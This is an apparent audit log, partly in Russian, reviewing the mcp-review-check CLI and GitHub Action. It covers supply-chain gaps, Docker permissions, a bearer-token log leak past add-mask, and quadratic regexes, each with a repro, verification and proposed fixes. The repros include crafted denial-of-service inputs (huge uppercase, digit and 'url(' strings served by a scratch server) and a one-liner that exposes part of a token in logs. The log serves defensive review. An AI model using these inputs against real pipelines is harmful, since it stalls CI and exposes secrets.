findings.fix: In the npx branch, set `npm_config_ignore_scripts=true` for that command (e.g. `cli=(env npm_config_ignore_scripts=true npx --yes ...)`). Better still: install first (`npm install --ignore-scripts --no-save --prefix "$RUNNER_TEMP/mrc" mcp-review-check@$INPUT_VERSION`), export the token only after that, and run `$RUNNER_TEMP/mrc/node_modules/.bin/mcp-review-check`. Add an assertion to test/remediation-w4d-action.test.ts that the npx path carries ignore-scripts.

The input description at line 39 says that an empty bearer keeps a MCP_REVIEW_CHECK_TOKEN the job already set, so the token can be in env even then. Line 138 is `cli=(npx --yes "mcp-review-check@$INPUT_VERSION")`. No guard exists: grep for `ignore-scripts` and `npm_config` in action.yml finds nothing, no `.npmrc` is involved, and `version_re` only checks the version string. Install scripts are therefore on for the fresh npx install, and the token is already exported when it runs. That fits the claim that today's risk is only a possible future compromised release. FINDINGS.md and REMEDIATION.md have no entry for this. F145 covers release.yml's `npm ci`, not action.yml, so this is not a known item.

I rate it low instead of medium. The CLI process itself runs with the token in env and imports its runtime dependencies. A compromised dependency could therefore read the token from its module code at run time, and `--ignore-scripts` would not stop that. The flag only blocks payloads that live in install scripts, which is the worm pattern. So it is cheap defense-in-depth for a hypothetical supply-chain event, not an exploitable flaw today. findings.title: No npm-shrinkwrap.json: pinning the action to a SHA, the Docker tag and the npx recipes all run a dependency tree that CI never tested
findings.claim: The published package ships no lockfile. Every consumer resolves `undici ^7.30.1`, `ajv ^8`, `zod ^4` and the SDK's transitive tree (express 5, hono, cross-spawn, eventsource, ...; 96 runtime packages) at install time: the action's npx (action.yml:138), the Docker build (Dockerfile:10) and every `npx mcp-review-check@1.0` recipe. In addition, the action's `version` default `'1.0'` (action.yml:45) means that `uses: alisaosipova/mcp-review-check@<sha>` runs whatever the newest npm 1.0.x is. The README (lines 103, 113) and docs/guide/ci.md:163 present pinning a tag or SHA as the hardening step and never say this. audit.yml and the ci.yml audit check package-lock.json, which users never receive. undici's EnvHttpProxyAgent and SOCKS5 support are experimental (src/proxy.ts:60 suppresses the warning), so a minor undici bump in that range can change proxy behaviour without any change in this repository.
findings.repro: Read the code and ran `npm pack --dry-run --json`: the 67 entries contain no npm-shrinkwrap.json. A lockfile scan shows 96 non-dev packages with caret/tilde parents. Not run against the registry (no third-party network).
findings.fix: Publish an `npm-shrinkwrap.json` (npm's recommended practice for CLIs: `npm shrinkwrap` before pack, or keep package-lock.json in sync and copy it in prepack). Then npx, the global install and the Docker image get the audited tree. Optionally default the action's `version` to the exact release version on each tag (CONTRIBUTING step 2 already edits it per minor), or document next to the SHA advice that `version` floats over patch releases.

votes.evidence: At 1f24aba the repository root holds only package-lock.json. There is no npm-shrinkwrap.json, and package.json does not list one in `files`. The runtime deps are ranges: `@modelcontextprotocol/sdk ~1.32.1`, `ajv ^8.20.0`, `undici ^7.30.1`, `zod ^4.6.7`. In action.yml the `version` default is '1.0' and the run step does `npx --yes "mcp-review-check@$INPUT_VERSION"`, so pinning the action to a SHA still runs the newest 1.0.x and whatever transitive tree the registry resolves at that moment. The Dockerfile does `npm install --global ... mcp-review-check@${VERSION}` with no lock. ci.yml:99 and audit.yml both run `npm audit --omit=dev` against the repo's package-lock.json, which consumers never get. src/proxy.ts:60 suppresses undici's experimental EHPA/SOCKS5 warning. README:113 ('pin a full release tag ... or a commit SHA') and ci.md:163 give no caveat about the dependency tree. No prior entry about this in FINDINGS.md or REMEDIATION.md. This is a design trade-off common to CLI packages, so low severity, but the factual claims all hold.

findings.title: Docker recipe `-v "$PWD/out:/out" ... --output /out/report.json` fails with EACCES for the non-root uid 10001
findings.claim: The image runs as `reviewer` uid 10001 (Dockerfile:22-23). docs/guide/ci.md:260-261 recommends mounting a writable folder and writing --output into it. On Linux Docker, a host directory owned by the user (uid 1000, mode 755), or one that Docker auto-creates as root, cannot be written by uid 10001. The CLI then prints `Error: cannot write --output ...: EACCES` and exits 2. Only Docker Desktop's file-sharing layer or rootless engines hide the problem. The smoke test in docker.yml:57 mounts read-only and never writes, so this path is untested.
findings.repro: Docker is not installed on this host, so the container run was NOT run. I ran the equivalent CLI path: `node dist/cli.js --plugin-dir test/fixtures/listing/plugin-valid --format json --output <dir chmod 555>/report.json` -> `Error: cannot write --output ...: EACCES`, exit=2.
findings.fix: Document `--user "$(id -u):$(id -g)"` in the recipe (the CLI needs no home directory writes), or add a writable `WORKDIR /work` owned by 10001 and tell users to `chmod`/`chown` the mount. Extend the docker.yml smoke test with a write to a `-v $RUNNER_TEMP/out:/out` mount using `--user $(id -u)`.

votes.evidence: Dockerfile:22-23 runs `adduser -D -u 10001 reviewer` and then `USER reviewer`. docs/guide/ci.md:261 recommends `docker run --rm -v "$PWD/out:/out" ... --output /out/report.json`. On a Linux engine, `-v` auto-creates a missing host directory as root:root 0755, and an existing user-owned 0755 directory belongs to uid 1000. uid 10001 can write to neither. src/cli.ts:588 then returns code 2 with `error: cannot write --output ...`. The docker.yml smoke test mounts `:ro` and never writes. Docker is not installed here, so the container run was not done. The conclusion follows from standard bind-mount semantics plus the code path in the CLI.

findings.title: The pushed image is a second, separate build: the smoke-tested image is not the one published, and arm64 is never executed
findings.claim: The `build` job builds and smoke-tests a linux/amd64 image with `load: true`. The `push` job then rebuilds from scratch for linux/amd64 and linux/arm64 and pushes the result. That image's `npm install` resolves the floating transitive tree again (see A08-03), and the base layers are re-pulled, so the published digest is not the tested artifact. The arm64 variant is never run at all. The workflow header says "the image never contains anything other than what npm users get", but nothing ties the pushed bits to the tested ones.
findings.repro: Read the code (docker.yml:42-61 vs 83-95). Not run: no Docker or GitHub runner here.
findings.fix: Build once: one buildx build for both platforms, pushed by digest (or exported to an OCI layout). Smoke-test each platform with `docker run --platform` (add docker/setup-qemu-action) against that digest. Then promote it with `docker buildx imagetools create -t $IMAGE:$version -t $IMAGE:latest <digest>` in the packages: write job. Together with a shrinkwrap this makes the tested and the published images the same.

votes.evidence: In docker.yml, the `build` job runs build-push-action with `load: true`, `push: false`, `tags: mcp-review-check:test`, and the smoke test uses that tag only. The `push` job, which `needs: build`, runs on a fresh runner and calls build-push-action again with `push: true` and `platforms: linux/amd64,linux/arm64`. It has no cache-from and does not reuse the tested image or its digest. So the published image is a new build whose `npm install` resolves the floating dependency tree again, and the arm64 variant is never executed. The header says 'the image never contains anything other than what npm users get', but nothing ties the pushed digest to the tested image.

findings.title: A bearer containing a newline is partly printed in the log by the add-mask echo before the CLI rejects it
findings.claim: `echo "::add-mask::$INPUT_BEARER"` registers a mask only for the first line. Every following line of the value is written to the job log as plain text. The CLI then rejects the token (`--bearer must not contain CR or LF`, exit 2), but by then the log already holds the rest of the value. A value from `secrets.*` is masked by the runner anyway. The exposure is real for a token from a step output or from `$(cat file)` with an embedded CR/LF, such as a file with Windows line endings.
findings.repro: Ran it: `INPUT_BEARER=$'abc\nsecondline' bash -c 'echo "::add-mask::$INPUT_BEARER"'` prints `::add-mask::abc` and then `secondline` raw. `MCP_REVIEW_CHECK_TOKEN=$'abc\nsecondline' node dist/cli.js http://127.0.0.1:9/mcp` -> `Error: --bearer must not contain CR or LF`, exit 2.
findings.fix: Before the add-mask line: `case "$INPUT_BEARER" in *$'\n'*|*$'\r'*) usage "bearer must not contain CR or LF (the value is not shown)";; esac`. It fails just as the CLI does, but without echoing anything.

votes.evidence: action.yml:130 has `if [ -n "$INPUT_BEARER" ]; then echo "::add-mask::$INPUT_BEARER"; ...`. Workflow commands are parsed line by line, so only the first line is registered as a mask and the following lines go to the log as plain stdout. Reproduced locally: `INPUT_BEARER=$'abc\nsecondline' bash -c 'echo "::add-mask::$INPUT_BEARER"'` prints `::add-mask::abc` followed by a raw `secondline`. The CLI rejects such a value only later (src/cli.ts:407 `--bearer must not contain CR or LF`, exit 2), after the echo has already written it. Values from `secrets.*` are masked by the runner per line, so the exposure is limited to tokens from step outputs or files, as the finding states. Not covered in FINDINGS.md or REMEDIATION.md.

findings.title: snakeCase/tokenize regex /([A-Z]+)([A-Z][a-z])/g is quadratic on names that are capped only at ID_CAP (1 MB)
findings.claim: snakeCase (called on every walkSchema visit, about 30 times per property per run) and tokenize (called on tool names by TOOL-027, POL-002, TOOL-004/005/008/028 and others) both run /([A-Z]+)([A-Z][a-z])/g. On a long run of uppercase ASCII with no following [A-Z][a-z], [A-Z]+ backtracks over the rest of the string at every start position, so the cost is O(n^2). Property names and tool names are cut at ID_CAP = 1 MB, not at TEXT_CAP. A server that sends one such name can stall the linter for minutes or hours. The work runs synchronously inside the rules, so --max-duration does not stop it (see A09-04).
findings.repro: RAN: a single snakeCase('A'.repeat(n)) call takes 39 ms at 10k, 333 ms at 30k and 3384 ms at 100k (quadratic). End to end, a stdio fixture whose only property is named 'A'.repeat(40000) takes 30.9 s, against 0.6 s with a lowercase name of the same length; node --cpu-prof attributes 26.5 s of that to 'RegExp: ([A-Z]+)([A-Z][a-z])'. A tool named 'A'.repeat(60000) takes 38 s, 31.4 s of it in the same regex. The in-process per-rule bench at 100k uppercase tool-name characters gives 27.7 s (TOOL-027 6.4 s, POL-002 3.1 s, TOOL-008 3.0 s, ...). Scratch server: export const tools=[{name:'q',description:'Query things.',inputSchema:{type:'object',properties:{['A'.repeat(40000)]:{type:'string'}}}}]; node dist/cli.js --stdio -- node srv.mjs fixture.mjs. NOT RUN, extrapolated: at the 1 MB cap a single call takes about 340 s.
findings.fix: Use a linear lookahead form in both places: .replace(/([A-Z])(?=[A-Z][a-z])/g, '$1_') in snakeCase and '$1 ' in tokenize. RAN: it gave identical output to the current pair of replaces on 300k random strings over [AaB0_ -], and takes 2 ms on 1 MB of 'A'. Optionally also cut the input to tokenize/snakeCase (e.g. the first 256 chars) because the result is only used for word matching.

findings.title: POL-003 ADS regex: the trailing alternative \d+% off! has no anchor, so it is quadratic on digit runs
findings.claim: In ADS = /\b(...)\b|\d+% off!/i the last alternative sits outside the \b group. It is tried at every digit position, and \d+ consumes the whole digit run before it fails on '%', which makes the scan O(n^2) in the length of the run. POL-003 runs it over every corpus entry: tool name (up to ID_CAP), title, description and every parameter description (TEXT_CAP 16 KB each, with no limit on how many there are). A tools/list of a few MB of digits therefore stalls the run, and --max-duration does not stop it.
findings.repro: RAN: in-process bench with 200 parameters whose descriptions are '0'.repeat(16000) (about 3.2 MB tools/list): POL-003 takes 29.9 s; with 'a' instead of '0' the whole rule set takes 0.34 s. End to end, tools=[{name:'q',title:'Q',description:'Query things.',inputSchema:{type:'object',properties:Object.fromEntries(Array.from({length:200},(_, i)=>['p'+i,{type:'string',description:'0'.repeat(16000)}]))},annotations:{...}}] with node dist/cli.js --max-duration 5000 --stdio -- node srv.mjs digits.mjs takes 16.2 s and exits 0. A tool name of 200k digits makes POL-003 take 12.4 s (764 ms at 50k).
findings.fix: Anchor the alternative: (?<!\d)\d+% off! (or \b\d+% off!). RAN: on 'get 50% off!', 'save 5% off! now', 'a50% off!' and 'x100% off!' it matches the same as before, and it takes 10 ms on 1 MB of digits, where the old regex takes 788 ms on 50k.

It has no anchor, and V8 tries it at every position inside a digit run, consuming the rest of the run each time before failing on '%'. That makes a run of n digits cost O(n^2). POL-003 (policy.ts:83-85) runs `ADS.exec(nfkc(e.text))` on every entry from `corpus(snap)` (src/rules/util/text.ts:100). The corpus includes the tool name, title, annotations.title, description, and each param description found through walkSchema, plus prompts and resources. I found only two guards: TEXT_CAP = 16 KB per string and ID_CAP = 1 MB for identifiers such as name (src/limits.ts:7,11). Nothing limits how many params or tools there are. Bench with node on the exact regex: '0'.repeat(4000) took 15 ms, 8000 took 37 ms and 16000 took 159 ms, a quadratic curve. 'a'.repeat(16000) took about 0 ms. 200 params at 16 KB of digits each therefore cost about 30 s, which matches the claimed 29.9 s. The rules are synchronous, so the --max-duration timer cannot fire while the regex runs; this is consistent with the claimed 16 s end to end at a 5000 ms limit (I did not rerun the end-to-end case). Only a hostile or broken server produces long digit runs, the effect is a slowdown of the linter itself with no wrong verdict and no leak, and earlier verifications rated similar DoS-by-hostile-server cases (F141, unbounded UI reads) low. The fix is trivial: `\b\d+% off!` or folding the alternative into the group.

Checked in a detached worktree at 1f24aba (since removed). Line 73 of src/rules/policy.ts defines ADS = /\b(...)\b|\d+% off!/i, and the last alternative sits outside the \b group. Between two digits there is no word boundary, so \b stops every other alternative right away. The bare \d+% off! has no such guard: the engine tries it at every digit position and consumes the rest of the run each time, which makes the scan quadratic. Microbench of the exact ADS regex taken from the source: '0'.repeat(4000) takes 6.1 ms, 8000 takes 23.2 ms and 16000 (TEXT_CAP) takes 107 ms. That is about 4x per doubling, so quadratic. 'a'.repeat(16000) takes 0.1 ms. A variant with (?<!\d) in front of \d+% off! takes 0.2 ms at 16000.

With digits it took 22.4 s and exited 0 ('Result: PASS (--fail-on error)', no stop reported). With 'a' it took 1.5 s. So --max-duration does not bound this, because the rules run after collection. The number of parameters has no cap, so the stall grows linearly with the count. Each entry costs about 0.1 s, so a few MB of digits stalls a CI run for tens of seconds or more.

Medium is right: this is a denial of service on the linter, triggered by the untrusted server data being linted, and it bypasses the documented time bound. It does not cause a wrong verdict. Fix: anchor the alternative, for example (?<!\d)\d+% off! or \b\d+% off!.

findings.title: extractOrigins CSS url() regex is quadratic on repeated 'url(' and runs twice per UI resource (APPS-007, APPS-013)
findings.claim: /(?<![\w$.]|\bnew\s+)url\(\s*["']?([^"')\s]+)["']?\s*\)/gi lets '(' into the captured class. On HTML like 'url(url(url(…' with no ')', every 'url(' start scans to the end of the input and then fails, which is O(n^2). The input is UI resource HTML capped at HTML_CAP = 2 MB, and up to UI_READS_CAP = 50 resources are read. APPS-007 and APPS-013 each call extractOrigins on the same HTML without sharing the result, so the cost is paid twice.
findings.repro: RAN: in-process bench with HTML 'url('.repeat(n/4): APPS-007 and APPS-013 each take 382 ms at 50k, 1.54 s at 100k and 6.3 s at 200k. End to end, a raw stdio server with one UI tool whose ui:// resource is that HTML at 200 KB (ui-srv.mjs 200000): node dist/cli.js --max-duration 3000 --stdio -- node ui-srv.mjs 200000 takes 13.5 s and exits 1; at 20 KB it takes 0.6 s. NOT RUN, extrapolated: at the 2 MB cap about 10 min per rule. Making the class atomic with (?=(...))\1 does not help: still 372 s on 2 MB (RAN).
findings.fix: Split the quoted and unquoted forms and keep '(' out of the unquoted class: /(?<![\w$.]|\bnew\s+)url\(\s*(?:"([^"\n]*)"|'([^'\n]*)'|([^"'()\s]+))\s*\)/gi, taking m[1] ?? m[2] ?? m[3]. RAN: 7-14 ms on 2 MB of 'url(', 'url("', "url('" and 'url("url('. It also captures '/a(b).png' and 'x' correctly, where the old regex captured '/a(b' and 'url(x'. Also cache extractOrigins results per HTML string (WeakMap keyed on the UiResource, or a Map keyed on uri) so APPS-007 and APPS-013 share one pass.

votes.evidence: I read commit 1f24aba with git show and did not create a worktree. In src/rules/util/html.ts:64 the CSS regex is /(?<![\w$.]|\bnew\s+)url\(\s*["']?([^"')\s]+)["']?\s*\)/gi. The class [^"')\s]+ allows '(', so on 'url(url(url(...' with no ')' each start passes the lookbehind (the character before it is '(') and scans to the end of the input before failing. V8 irregexp does not memoize, so the total cost is O(n^2). No earlier step limits it. APPS-007 (src/rules/apps.ts:204) and APPS-013 (apps.ts:342) each call extractOrigins(r.html) on the raw HTML with no stripComments and no shared cache. The only size limit is HTML_CAP = 2 MB per resource (limits.ts:13, enforced in capSnapshot), and up to UI_READS_CAP = 50 resources are read (connect.ts:172). --max-duration does not guard this. The deadline belongs to buildSnapshot/withStops (connect.ts:783-837), and runRules runs synchronously afterwards (cli.ts:496 then cli.ts:512), so the timer cannot interrupt the regex. That matches the 13.5 s end-to-end run under --max-duration 3000 reported in the finding. RAN: a standalone bench of that exact regex on 'url('.repeat(n/4) took 25k → 199 ms, 50k → 861 ms, 100k → 2853 ms, which is clearly quadratic. Extrapolated (NOT RUN): about 15-20 min per rule on 2 MB, twice per resource, and up to 50 resources. FINDINGS.md and REMEDIATION.md have no earlier ReDoS or quadratic item for html.ts (F084 and F101 are about correctness of the same regex, not performance), so this is not a duplicate. Severity: the claim is true, but benign HTML stays linear, because a quote, ')' or whitespace soon ends each scan. Only a hostile or broken server that serves a crafted ui:// resource triggers it, and the harm is denial of service of the linter itself: a hang that bypasses --max-duration. It does not produce a wrong verdict or leak anything. Earlier findings set the same precedent: comparable denial of service from a hostile server (F141, the unbounded UI reads item) was rated low. Hence low instead of medium. Fix direction: exclude '(' (and probably '<' and ';') from the captured class, for example [^"'()\s<>]+, which makes it linear, and compute extractOrigins once per resource for both rules.

I checked this in a detached worktree at 1f24aba (built with npm ci --ignore-scripts and npm run build), then removed the worktree.

Code: src/rules/util/html.ts:64 has the regex `/(?<![\w$.]|\bnew\s+)url\(\s*["']?([^"')\s]+)["']?\s*\)/gi`. Its captured class does not exclude '(', so on 'url(url(url(...' with no ')' every match start scans to the end of the input. extractOrigins(r.html) is called separately by APPS-007 (src/rules/apps.ts:204) and APPS-013 (apps.ts:342), and the result is not shared. HTML_CAP is 2 MB and UI_READS_CAP is 50 (src/limits.ts:13,21).

In-process bench of extractOrigins with 'url('.repeat(n/4):
- 50k: 488 ms
- 100k: 1893 ms
- 200k: 8500 ms
- Clearly quadratic. A benign 1.9 MB stylesheet of real url(x.png) entries takes 49 ms.

End to end: a raw stdio server with one UI tool whose ui://w/app.html resource holds that HTML, run as `node dist/cli.js --max-duration 3000 --stdio -- node ui-srv.mjs N`:
- 20 KB: 0.89 s
- 200 KB: 16.7 s
- 400 KB: 95 s

--max-duration 3000 does not stop it, because the regex runs synchronously in the rules phase. Exit 1 comes from the normal findings, not from the deadline; the report printed normally. Extrapolated to the 2 MB cap, this is roughly tens of minutes per rule, times 2 rules, times up to 50 resources.

This is not in FINDINGS.md or REMEDIATION.md: F084 and F101 deal with the same regex but are about correctness, not performance. Severity: medium. Only a hostile or broken server can trigger it, but it turns the 2 MB input cap and --max-duration into a CI hang.

findings.title: --max-duration does not bound rule evaluation: a slow rule phase ends with exit 0/1, not 4
findings.claim: --help says '--max-duration <ms> Stop the whole check after this long and report what ran, exit 4'. The deadline is only checked at connect, listing and probe checkpoints. runRules is a synchronous loop with no deadline check, so a CI job that relies on --max-duration to bound the run still runs until the slow rules finish. It then exits with the normal code, and limits.stopped is not set. The quadratic paths in A09-01..03 are exactly this case.
findings.repro: RAN: --max-duration 3000 on a 60k uppercase property name: 22.3 s, exit 1. --max-duration 3000 on the 200 KB 'url(' UI resource: 13.5 s, exit 1. --max-duration 5000 on the 200 x 16 KB digit descriptions: 16.2 s, exit 0.
findings.fix: Check the deadline in the runRules loop (between rules, using the same clock as the connect checkpoints). Once it has passed, mark the remaining rules skipped with STOPPED_REASON and phase 'rules', set snap.limits.stopped, and exit 4 as documented. For a hard bound, run runRules in a worker_thread and terminate() it at the deadline. Fixing A09-01..03 removes the known triggers but not the class.

votes.evidence: Read-only via git show 1f24aba. I did not create a worktree or run anything. The --max-duration deadline exists only inside buildSnapshot: withStops (src/connect.ts:822-852) arms setTimeout(fire, ms), races it against the run, and calls clearTimeout(timer) in `finally` as soon as buildSnapshot settles. After that, cli.ts:512 calls runRules(snap, RULES, { ignore }) synchronously. runRules (src/rules/engine.ts:168-) is a plain for-loop over the rules with no clock or deadline check, and no worker thread or async yield, so no timer could fire during it even if one were still armed. The exit code at cli.ts:563 is `snap.fatal ? 3 : snap.limits?.stopped ? 4 : ...`. limits.stopped is set only by stoppedSnapshot inside withStops, so a slow rule phase ends with the normal 0 or 1, not 4. A grep of src for deadline and worker_threads finds no other guard. This contradicts the --help text at cli.ts:55, "Stop the whole check after this long and report what ran, exit 4". README:141 is narrower: "4 = --max-duration stopped the check after the handshake". Neither document says the rule phase is outside the deadline. The issue is not in FINDINGS.md or REMEDIATION.md (searched for runRules, max-duration and quadratic; no match). Rule-phase time is the only thing I could not check without running it: I did not reproduce the 22 s / 13.5 s / 16.2 s timings, and the claim that real servers produce such slow rules rests on A09-01..03. Why low and not medium: the root cause and the real-world impact sit in the quadratic rules (A09-01..03). Once those are fixed, rule evaluation over the capped snapshot is fast, and what remains is a gap between the documented contract and the code (help says "whole check" while the deadline covers only connect, listing and probes). That needs either a help/README wording fix or a deadline check between rules. It is a UX/contract issue, not a deterministic MUST violation.

Reproduced at 1f24aba, built in a detached worktree (since removed). Code: in src/cli.ts:512, runRules(snap, RULES, { ignore }) runs after buildSnapshot returns. runRules (src/rules/engine.ts:169ff) is a synchronous for-loop over the rules with no deadline check. The exit code (cli.ts:563) is 4 only when snap.limits.stopped is set, and only the connect/listing/probe checkpoints set it. --help (cli.ts:55) says "Stop the whole check after this long ... exit 4", and spec.md:1212 says "Overall deadline for the whole check". Run: a local stdio fixture with one tool whose inputSchema has a single property named 'A'.repeat(N), started as `node dist/cli.js --max-duration 3000 --format json --stdio -- node slow.mjs N`. With N=2000: wall 0.99 s, exit 1. With N=60000: wall 49.2 s, exit 1, report durationMs 48767, limits.stopped undefined, so no INCOMPLETE and no exit 4. The handshake and listing finished well inside the deadline (otherwise the stop would have been recorded), so the extra ~48 s is spent in rule evaluation, which --max-duration does not bound. The CI time bound and the exit-4 contract fail whenever a rule is slow. Severity medium: a documented contract is broken and the run took 16x the deadline on a 60 KB input. The root cause of the slowness is the quadratic rules (A09-01..03); this finding is the missing safety bound.

findings.title: SARIF rendering crashes with RangeError: Invalid string length at about 80k tools (a tools/list of about 9 MB, well inside the 64 MB snapshot budget)
findings.claim: renderSarif pretty-prints the whole log with JSON.stringify(…, null, 2). That is about 1010 bytes per result, against 525 bytes compact. Many-tools fixtures produce about 7 results per tool. At 80,000 tools the string passes V8's maximum string length, and the run dies with 'fatal: RangeError: Invalid string length at JSON.stringify … renderSarif'. It exits 3 with no report and no --output file. Before that point memory is already high: 1.66 GB peak RSS at 32k tools in SARIF, against 0.51 GB for text. NOT RUN: by the same arithmetic, --format json (about 4.1 KB per tool) would hit the same limit at roughly 125k tools.
findings.repro: RAN: sed 's/length: 400/length: 80000/' test/fixtures/many-tools-server.mjs > many80000.mjs; NODE_OPTIONS=--max-old-space-size=3500 node dist/cli.js --format sarif --output out.sarif --stdio -- node many80000.mjs prints 'fatal: RangeError: Invalid string length at JSON.stringify (<anonymous>) at renderSarif (dist/report/sarif.js:74:17)', exits 3 after 10 s, and writes no file. Measured: 8000 tools give a 56.6 MB SARIF (56,003 results), and 32000 tools peak at 1657 MB RSS.
findings.fix: Bound the report. Above a threshold (e.g. 5000 results per rule, or 25,000 per run), collapse the repeated per-tool findings of one rule into a single result that carries a count and the first N subjects, and say so in the summary. Drop the indentation when the result count is large, or stream the results array to the output. Catch RangeError in render and print a clear 'report too large' error with a hint (--ignore, --target), not the internal-bug 'fatal:' text.

votes.evidence: Reproduced at 1f24aba in a detached worktree, which has since been removed. src/report/sarif.ts:82 is `JSON.stringify(toSarif(r, location), null, 2) + '\n'`, so the whole log is pretty-printed into one string. I generated many80000.mjs from test/fixtures/many-tools-server.mjs with length 80000. The tools/list response it sends is 10,537,802 bytes, well under SNAPSHOT_BUDGET = 64 MiB in src/limits.ts. I ran `NODE_OPTIONS=--max-old-space-size=3500 node dist/cli.js --format sarif --output out.sarif --stdio -- node many80000.mjs`. It exited 3 with `fatal: RangeError: Invalid string length at JSON.stringify (<anonymous>) at renderSarif (dist/report/sarif.js:74:17) at render (dist/cli.js:201) at runCli (dist/cli.js:607)` and wrote no out.sarif. This is not a duplicate of known items. F136 covers a different site, the spread in the protocol list readers. F146 limits the input bytes, not the size of the rendered output. Nothing in FINDINGS.md or the REMEDIATION.md deferred tables covers report or output size. Low severity is right: it needs a pathological server, exit 3 is a clear failure rather than a false PASS, and nothing leaks. I did not check the json-format extrapolation or the RSS figures.

findings.title: --fail-on-incomplete: exit 3, а Result/summary.failed/JUnit/GitHub говорят PASS
findings.claim: Exit code 3 для неполной проверки вычисляется только в cli.ts:563 (`values['fail-on-incomplete'] && partial ? 3`). В buildReport флаг не передаётся, поэтому отчёт противоречит exit code во всех форматах: в text и markdown `Result: PASS (--fail-on error)`, в summary-строке --output тоже `PASS`, в JSON `summary.failed=false` и `gate.reason=null`, в JUnit `failures=0 errors=0` (GitLab/Jenkins показывают зелёный job при exit 3). При GITHUB_ACTIONS печатается только `::warning … --fail-on-incomplete fails the run on a partial check.`, хотя флаг уже передан, а --help обещает: "exit 3 and 4 as one ::error with its cause". Новичок, который добавил флаг по совету warning'а, видит PASS и красный job одновременно.
findings.repro: ЗАПУСКАЛ. Локальный OAuth-сервер на 127.0.0.1:58432, который на /mcp отвечает 401 + PRM + AS metadata (scratchpad/r3/s401.mjs). `node dist/cli.js --fail-on-incomplete --quiet http://127.0.0.1:58432/mcp` → `Result: PASS (--fail-on error) · partial check: auth-required (...)`, exit=3. С `--format json`: summary.failed False, gate.reason None. С `--format junit`: `failures="0" errors="0"`. С `--output ../o.txt`: `… PASS (--fail-on error) · report written …`, exit=3. С `GITHUB_ACTIONS=true` приходит только ::warning, ::error нет.
findings.fix: Передавать failOnIncomplete в buildReport (как failOn). При partial && failOnIncomplete: summary.failed=true, gate.reason='partial check: <level>', Result `FAIL (partial check: auth-required; --fail-on-incomplete)`, в JUnit `<error type="incomplete">`, в GitHub `::error` вместо `::warning`. Хвост «--fail-on-incomplete fails the run» выводить только когда флага нет.

votes.evidence: Проверено чтением кода через git show 1f24aba (без worktree и без запусков). (1) src/cli.ts:524 вызывает buildReport(snap, gated, …, failOn, started, dur, !!values['fail-on-spec']), а флаг --fail-on-incomplete туда не передаётся. Учитывается он только в cli.ts:563: `values['fail-on-incomplete'] && partial ? 3`. (2) src/report/index.ts:58: `failed: failed || !!snap.fatal || !!snap.limits?.stopped`. Комментарий на :56-57 прямо говорит, что `failed` при неполной проверке следует гейту --fail-on, а --fail-on-incomplete обрабатывает CLI. Поэтому JSON summary.failed=false, а gate.reason=null (score.ts:72). (3) resultLine (index.ts:140-143) выдаёт `PASS (--fail-on …)` и в конце `partial check: <level>`, когда causes=true. Это значение используют text (text.ts:176), markdown (markdown.ts:60) и строка summaryLine для --output (cli.ts:567). (4) JUnit (junit.ts:49) пишет failure/error только при snap.fatal или limits.stopped, поэтому при exit 3 по неполной проверке получается failures=0 errors=0. (5) github.ts:26-35 печатает ::error только при fatal или stopped. Для неполной проверки всегда печатается ::warning, и в конце безусловно добавляется фраза «--fail-on-incomplete fails the run on a partial check.», даже если флаг уже передан. При этом --help (cli.ts:127-128) обещает «exit 3 and 4 as one ::error with its cause»: для exit 3 по неполной проверке это обещание не выполняется. Защит, которые это предотвращали бы, в коде нет. Смягчающие факторы, из-за которых severity low, а не medium: сам exit code правильный, и CI-job всё равно падает (утверждение «GitLab/Jenkins показывают зелёный job» преувеличено: зелёным будет только тестовый отчёт JUnit, а не job). Per-platform вердикты при неполной проверке равны INCOMPLETE (score.ts:30). В Result-строке есть «partial check: …». CHANGELOG:173 сознательно документирует ::warning «with or without --fail-on-incomplete». В FINDINGS.md и REMEDIATION.md (R013/Q6) эта несогласованность не значится ни как исправленная, ни как отложенная. Итог: противоречие между PASS/failed=false в отчёте и exit 3 реально, расхождение с --help по ::error тоже реально.

findings.title: Сервер, который отвечает только на initialize: 3,5 минуты тишины с дефолтами
findings.claim: Если tools/list зависает, CLI всё равно по очереди ждёт каждый следующий запрос (resources/list, templates, prompts/list, пробы SPEC-008/009 и т.д.) полный --timeout. При дефолтных 30000 мс и --max-duration без лимита это около 7 x timeout. Весь вывод собирается в runCli и печатается только в конце (cli.ts:648-650), а progress-строки нет даже на TTY. Новичок 210 секунд не видит ничего и думает, что инструмент завис.
findings.repro: ЗАПУСКАЛ. `node dist/cli.js --stdio 'node test/fixtures/hang-server.mjs' --quiet` → 210 s, затем 3x SPEC-020 'Request timed out', exit 1. С `--timeout 2000` → 14.9 s (≈7x2 s).

votes.evidence: Code at 1f24aba: buildStdio (src/connect.ts ~704-760) runs listEverything, then readUiResources, then runWireProbes, one after another, and each request gets the full timeoutMs (default 30000). listEverything (connect.ts:144) loops tools/list → resources/list → resources/templates/list → prompts/list with no early exit after tools/list times out. improvements.title: SARIF levels ignore the gate, unlike annotations and JUnit
improvements.detail: toSarif sets result.level from f.severity. With --target chatgpt and no --fail-on-spec, findings that apply only to spec (APPS-001, SRV-018, TOOL-016 on bad-server) are uploaded as code-scanning 'error' alerts, while GitHub annotations and the exit code treat them as ungated. improvements.title: PY_EXACT rejects PEP 440 arbitrary equality (===)
improvements.detail: launcherOf([uvx, pkg===1.0]) returns pinned:false, so LST-008 raises an error on an exact pin. This is rare, and the fix is to accept `===` in PY_EXACT.

improvements.title: stdio servers get only getDefaultEnvironment()

That is safe (the token is not leaked to the reviewed server), but a stdio server behind a corporate proxy fails without a clear hint. Document it in the --stdio and --env help text.

improvements.title: Listing page size is counted in UTF-16 units, not bytes
improvements.detail: legacy.ts listAll charges JSON.stringify(result).length against LIST_BYTE_BUDGET, so multi-byte text can be about 3x the stated byte cap. This is minor: the name should change or Buffer.byteLength should be used.

findings.line: 79-105 (launcherOf), used by LST-008 line 284 and LST-009 line 304
findings.title: LST-008/LST-009 do not see common launcher forms: npm exec / npm x, bun x, uv tool run, pnpx, cmd /c npx, env A=1 npx; uv run accepts --locked placed after the script
findings.claim: launcherOf only recognises argv[0] in {npx,bunx,uvx} or the exact pairs pnpm dlx, yarn dlx, pipx run, uv run. Several forms that do the same thing return undefined: `npm exec`/`npm x` (the same as npx), `bun x` (the same as bunx), `uv tool run` (the same as uvx), `pnpx`, and the Windows wrapper `cmd /c npx ...` or an `env K=V npx ...` prefix. For these, LST-008 (claude: error) reports nothing on an unpinned package. LST-009 also bails out early because it decides whether the plugin uses a launcher through launcherOf, so an .npmrc that sets a foreign registry is not reported either. Separately, `uv run` counts as pinned when `--locked` appears anywhere in argv, including after the script name, where it is an argument for the server and not for uv. That is a false negative.
